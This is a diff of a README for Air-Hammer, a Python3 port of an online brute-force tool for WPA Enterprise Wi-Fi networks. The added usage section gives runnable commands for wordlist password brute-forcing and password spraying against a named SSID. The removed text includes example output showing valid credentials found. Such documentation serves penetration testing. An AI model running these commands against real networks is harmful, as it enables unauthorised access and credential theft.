@@ -1,43 +1,39 @@
-# air-hammer
-Python3 version of the original air-hammer
-Air-Hammer - A WPA Enterprise horizontal brute-force attack tool
+Air-Hammer (Python3 version) - A WPA Enterprise horizontal brute-force attack tool
 ==========
-*Created by Michael "Wh1t3Rh1n0" Allen, 2016-09-01*
 
-Introduction
-------------
-Air-Hammer is an online brute-force attack tool for use against WPA Enterprise networks. Although WPA Enterprise is often considered "more secure" than WPA-PSK, it also has a much larger attack surface. While WPA-PSK networks have only one valid password, there may be thousands of valid username and password combinations which grant access to a single WPA Enterprise network. Further, passwords used to access WPA Enterprise networks are commonly selected by end users, many of whom select **extremely common passwords**.
+This tool was originally developed by **Wh1t3Rh1n0** and all credit goes to him. The original is available [HERE](https://github.com/Wh1t3Rh1n0/air-hammer).
 
-Air-Hammer has several advantages over current attacks against WPA Enterprise networks including:
-
-* Client-less attacks
-* Potentially larger attack surface
-* Minimal hardware requirements
-
-For a more detailed introduction to Air-Hammer, see my original blog post on it [here][1]
-
-
-Screenshots
------------
-![Air-Hammer in use](http://mikeallen.org/images/air-hammer-01.jpg)
-
-
-Installing dependencies
------------------------
-Air-Hammer has been built and used on the current version of Kali Linux. In addition to packages that come with Kali Linux by default, the following dependencies need to be installed:
-
-* [python-wpa-supplicant][2]:
-
-        root@kali:~# pip install wpa_supplicant
-
-
-Other requirements
-------------------
-Air-Hammer requires a list of usernames that are valid for the target network in order to function. Some basic suggestions for creating this list are included in [step 2 of the attack chain outlined on my blog][3].
 
 
 Usage
 -----
+
+ ```bash
+git clone
+cd air-hammer
+python3 -m venv ~/myenv
+source ~/myenv/bin/activate
+pip install wpa_supplicant
+ ```
+**Password Bruteforce**:
+```bash
+echo 'CONTOSO\\test' > test.user
+sudo /home/kali/myenv/bin/python air-hammer.py -i wlan3 -e wifi-corp -p /usr/share/wordlists/rockyou-utf8.txt -u test.user
+```
+
+**Username Bruteforce/ Password Spray**:
+```bash
+sudo /home/kali/myenv/bin/python air-hammer.py -i wlan3 -e wifi-corp -P 12345678 -u top-usernames-shortlist.txt
+```
+Things to note:
+- Make sure to use the full path to the Python executable within the virtual environment: /home/kali/myenv/bin/python
+- It might not accept the standard rockyou.txt, convert rockyou.txt to utf8:
+  ```bash
+  iconv -f ISO-8859-1 -t UTF-8 /usr/share/wordlists/rockyou.txt -o rockyou-utf8.txt
+  ```
+
+
+
 The `-h` or `--help` flags can be used to display Air-Hammer's usage instructions.
 
 ```
@@ -63,18 +59,3 @@ optional arguments:
                 0.5)
 ```
 
-Example
--------
-Below is a standard attack using wlan0 to target the "Test-Network" wireless network with the password, "UserPassword1", and a list of usernames stored in the file, "usernames.txt".
-
-```
-root@kali:~# ./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt 
-[0]  Trying alice:UserPassword1...
-[1]  Trying bob:UserPassword1...
-[2]  Trying charlotte:UserPassword1...
-[3]  Trying dave:UserPassword1...
-[4]  Trying wifiuser:UserPassword1...
-[!] VALID CREDENTIALS: wifiuser:UserPassword1
-[5]  Trying wrongUser05:UserPassword1...
-[6]  Trying wrongUser06:UserPassword1...
-```
